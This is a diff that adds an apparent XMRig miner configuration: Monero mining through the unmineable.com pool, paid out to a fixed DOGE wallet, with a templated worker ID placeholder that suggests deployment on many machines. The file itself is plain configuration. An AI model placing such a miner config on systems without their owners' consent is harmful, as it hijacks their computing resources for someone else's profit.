@@ -1,0 +1,24 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "rx": [4,5,6,7]
+    },
+    "randomx": {
+        "mode": "fast",
+        "numa": false
+    },
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "rx.unmineable.com:3333",
+            "user": "DOGE:DTiQZt5t2iB7agoGbzrFJYMFePWJ8yNkrx.{{WORKER_ID}}#U-3JKDDD",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        }
+    ],
+    "donate-level": 1,
+    "print-time": 60
+}
